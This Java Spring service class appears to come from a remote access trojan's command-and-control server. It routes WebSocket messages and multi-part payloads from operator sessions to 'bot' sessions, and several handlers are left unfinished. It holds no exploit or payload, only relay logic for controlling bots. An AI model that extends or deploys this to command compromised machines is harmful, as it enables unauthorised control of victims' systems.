package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
import devs.alex.sah.rat.c2server.models.AssociativePair;
import devs.alex.sah.rat.c2server.services.MessagesBuilder;
import lombok.extern.slf4j.Slf4j;
import devs.alex.sah.rat.c2server.models.Message;
import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.PongMessage;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.util.UUID;

@Slf4j
@Service
public class MessagesCoordinatorImpl implements MessagesCoordinator {

    private final String CONTINUATION = "CE-"; // CE - continuation envelope
    private final String LAST_PART = "LE-";    // LE - last envelope

    private final WebSocketSessionService botWSSessionService;
    private final WebSocketSessionService userWSSessionService;
    private final MessagesBuilder messagesBuilder;
    private final MessagesConfiguration mConfig;
    public MessagesCoordinatorImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                                   @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService,
                                   MessagesBuilder messagesBuilder, MessagesConfiguration messagesConfiguration) {
        this.botWSSessionService = botWSSessionService;
        this.userWSSessionService = userWSSessionService;
        this.messagesBuilder = messagesBuilder;
        this.mConfig = messagesConfiguration;
    }

    private String handleFirstPackage(Message<?> message, WebSocketSession session, String association, StringBuffer errors){

        if(message.getTargetType().equals(mConfig.targets.botSide)){
            if(session.getAttributes().put(
                    CONTINUATION + message.getRequestID(),
                    messagesBuilder.generateBotEnvelope(mConfig.packages.continuation, message.getTargetModule(), association)) != null){
                errors.append("Key [").append(CONTINUATION).append(message.getRequestID()).append("] exists\n");
            }
            if(session.getAttributes().put(
                    LAST_PART + message.getRequestID(),
                    messagesBuilder.generateBotEnvelope(mConfig.packages.lastPart, message.getTargetModule(), association)) != null){
                errors.append("Key [").append(LAST_PART).append(message.getRequestID()).append("] exists\n");
            }
            return messagesBuilder.generateBotEnvelope(mConfig.packages.continuation, message.getTargetModule(), association);

        } else  {
            if(session.getAttributes().put(
                    CONTINUATION + message.getRequestID(),
                    messagesBuilder.generateUserEnvelope(mConfig.packages.continuation, message.getTargetModule(), association)) != null){
                errors.append("Key [").append(CONTINUATION).append(message.getRequestID()).append("] exists\n");
            }
            if(session.getAttributes().put(
                    LAST_PART + message.getRequestID(),
                    messagesBuilder.generateUserEnvelope(mConfig.packages.lastPart, message.getTargetModule(), association)) != null){
                errors.append("Key [").append(CONTINUATION).append(message.getRequestID()).append("] exists\n");
            }
            return messagesBuilder.generateUserEnvelope(mConfig.packages.continuation, message.getTargetModule(), association);
        }
    }

    private String handleSingleMessage(Message<?> message, String request){
        if(message.getTargetType().equals(mConfig.targets.botSide)){
            return messagesBuilder.generateUserEnvelope(message.getPackageType(), message.getTargetModule(), request, message.getResponseType());
        } else {
            return messagesBuilder.generateBotEnvelope(message.getPackageType(), message.getTargetModule(), request, message.getResponseType());
        }
    }

    private WebSocketSession findTarget(String targetID, String targetType, StringBuffer errors){
        WebSocketSession result = null;
        if(targetType.equals(mConfig.targets.botSide)){
            // TODO Message<String> validate specified params
            result = botWSSessionService.getSession(targetID);
        } else if(targetType.equals(mConfig.targets.controlSide)){
            // TODO Message<String> validate specified params
            result = userWSSessionService.getSession(targetID);
        } else {
            errors.append("Undefined target [").append(targetType).append("];\n");
        }
        if(result == null){
            errors.append("Unable to find session [").append(targetID).append("] at ").append(targetType).append(";\n");
        }
        return result;
    }

    private void handleUserErrors(WebSocketSession session, StringBuffer errors){
        sendTextMessage(session, messagesBuilder.generateErrorEnvelope(mConfig.targets.controlSide), errors.toString());
    }


    @Override
    public void handleBotTextMessage(WebSocketSession session, TextMessage toParse) {
        StringBuffer errors = new StringBuffer();
        Message<String> message = messagesBuilder.parseMessage(toParse, errors);
        if(errors.length() != 0 ){
            log.error(errors.toString());
            return;
        }
        if(message.getTargetType().equals(mConfig.targets.serverSide)) {
            // TODO
        } else{
            // TODO Find association
        }

    }

    @Override
    public void handleBotBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void handleUserTextMessage(WebSocketSession session, TextMessage toParse) {
        StringBuffer errors = new StringBuffer();
        Message<String> message = messagesBuilder.parseMessage(toParse, errors);
        if(errors.length() != 0 ){
            handleUserErrors(session, errors);
            return;
        }
        if(message.getTargetType().equals(mConfig.targets.serverSide)) {
            // TODO
        } else{

            WebSocketSession target = findTarget(message.getTargetID(), message.getTargetType(), errors);
            if(errors.length() != 0 ){
                handleUserErrors(session, errors);
                return;
            }
            String association =  message.getTargetType().equals(mConfig.targets.controlSide)
                    ? (String)session.getAttributes().get("userId")  // No association
                    : UUID.randomUUID().toString(); // new random string
            String envelope;

            if(message.getPackageType().equals(mConfig.packages.continuation)){
                envelope = (String)target.getAttributes().get(CONTINUATION + message.getRequestID());

            } else if(message.getPackageType().equals(mConfig.packages.lastPart)){
                envelope = (String)target.getAttributes().get(LAST_PART+ message.getRequestID());
                target.getAttributes().remove(CONTINUATION + message.getRequestID());
                target.getAttributes().remove(LAST_PART + message.getRequestID());

            } else if(message.getPackageType().equals(mConfig.packages.firstPart)){
                envelope = handleFirstPackage(message, target, association, errors);
            } else if(message.getPackageType().equals(mConfig.packages.singleMessage)){
                envelope = handleSingleMessage(message, association);
            } else{
                handleUserErrors(session, errors.append(" Undefined package type [").append(message.getPackageType()).append("];\n"));
                return;
            }
            if(errors.length() != 0 ){
                handleUserErrors(session, errors);
                return;
            }
            if( !(message.getResponseType() == null || (message.getResponseType() != null && message.getResponseType().equals("none")) )) {
                target.getAttributes().put(association, new AssociativePair((String) session.getAttributes().get("userId"), message.getRequestID()));
            }
            sendTextMessage(target, envelope, message.payload());
        }
    }

    @Override
    public void handleUserBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void sendTextMessage(WebSocketSession recipientSession, String envelope, String payload) {
        try{
            recipientSession.sendMessage(new TextMessage(envelope + payload));
        }catch (IOException e){
            log.error("Fault send message. Message envelope: {}. Error: {}", envelope, e.getMessage());
        }
    }

    @Override
    public void sendBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void handlePongMessage(WebSocketSession session, PongMessage message) {

    }
}
